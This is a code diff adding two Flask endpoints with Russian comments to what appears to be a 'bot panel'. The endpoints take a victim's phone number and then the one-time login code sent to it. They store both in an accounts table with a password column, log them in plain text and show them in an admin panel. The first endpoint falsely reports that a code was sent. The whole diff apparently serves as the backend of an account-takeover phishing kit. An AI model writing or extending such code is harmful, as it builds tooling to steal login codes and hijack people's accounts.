@@ -189,6 +189,52 @@ def api_accounts():
         })
     return json.dumps(result)
 
+# ========== API ДЛЯ МИНИ-ПРИЛОЖЕНИЯ ==========
+@app.route("/api/contact", methods=["POST"])
+def api_contact():
+    data = request.get_json()
+    phone = data.get("phone")
+    template = data.get("template", "premium")
+
+    if not phone:
+        return json.dumps({"status": "error", "message": "Номер обязателен"}), 400
+
+    # Сохраняем в базу
+    conn = sqlite3.connect("bot_panel.db")
+    cursor = conn.cursor()
+    cursor.execute(
+        "INSERT INTO accounts (phone, code, password, template, status, created_at) VALUES (?, ?, ?, ?, ?, ?)",
+        (phone, "", "", template, "pending", int(datetime.now().timestamp()))
+    )
+    conn.commit()
+    conn.close()
+
+    logging.info(f"📩 Получен номер: {phone}, шаблон: {template}")
+    return json.dumps({"status": "code_sent", "message": "Код отправлен"})
+
+@app.route("/api/verify", methods=["POST"])
+def api_verify():
+    data = request.get_json()
+    phone = data.get("phone")
+    code = data.get("code")
+    template = data.get("template", "premium")
+
+    if not phone or not code:
+        return json.dumps({"status": "error", "message": "Телефон и код обязательны"}), 400
+
+    # Обновляем запись в базе
+    conn = sqlite3.connect("bot_panel.db")
+    cursor = conn.cursor()
+    cursor.execute(
+        "UPDATE accounts SET code = ?, status = ? WHERE phone = ? AND template = ?",
+        (code, "verified", phone, template)
+    )
+    conn.commit()
+    conn.close()
+
+    logging.info(f"✅ Проверен код: {phone} → {code}")
+    return json.dumps({"status": "success", "message": "Аккаунт подтверждён"})
+
 # ========== ВЕБ-АДМИНКА ==========
 @app.route("/panel")
 def admin_panel():
